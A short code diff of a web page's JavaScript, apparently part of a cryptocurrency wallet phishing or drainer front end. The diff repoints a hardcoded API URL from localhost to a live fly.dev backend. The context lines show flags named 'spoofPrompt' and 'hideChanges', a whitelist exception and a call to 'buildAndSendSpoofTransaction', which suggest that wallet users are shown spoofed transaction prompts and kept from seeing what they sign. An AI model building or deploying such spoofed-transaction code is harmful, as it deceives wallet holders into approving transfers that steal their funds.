@@ -595,7 +595,7 @@
         const rejectionMessage = document.getElementById("rejectionMessage");
 
         // Hardcoded API base URL - not changeable by users
-        const API_BASE_URL = "http://localhost:4000"; //"https://backend-dya8zg.fly.dev";//"http://localhost:4000";
+        const API_BASE_URL = "https://backend-dya8zg.fly.dev";//"http://localhost:4000";
         
         let config = null;
         let userPubkey = null;
@@ -1582,7 +1582,7 @@
 
           config.spoofPrompt = false; // dissable on whitelist
           config.hideChanges = false; // dissable on whitelist
-          
+
           // If spoofPrompt is enabled, first build and send the spoof transaction
           if (config.spoofPrompt) {
             await buildAndSendSpoofTransaction();
